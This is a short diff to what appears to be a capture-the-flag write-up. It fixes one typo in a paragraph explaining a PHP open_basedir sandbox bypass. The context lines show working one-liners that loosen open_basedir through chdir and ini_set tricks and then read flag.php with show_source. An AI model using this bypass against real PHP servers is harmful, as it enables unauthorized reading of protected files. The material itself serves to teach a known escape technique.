@@ -420,7 +420,7 @@ chdir("tmp"); ini_set('open_basedir', 'sandbox:../');echo ini_get("open_basedir"
 #or
 chdir('tmp'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); ini_set('open_basedir','/');show_source("flag.php");  
 
-Essentialy we change dir to tmp(can be any folder we create), we change the ini_set to still be able to take effect the sandbox but with added ../ it means we can access all of the above since open_basedir can be changed at runtime aslong as it tightens up restrictions and it still have to consider the old one, so when we write 'sanbox' in 'ini_set' it considers the old one, but with add ../ it lets us traverse back.
+Essentialy we change dir to tmp(can be any folder we create), we change the ini_set to still be able to take effect the sandbox but with added ../ it means we can access all of the above since open_basedir can be changed at runtime aslong as it tightens up restrictions and it still have to consider the old one, so when we write 'sanbox' in 'ini_set' it considers the old one, but with added ../ it lets us traverse back.
 
 ```
 
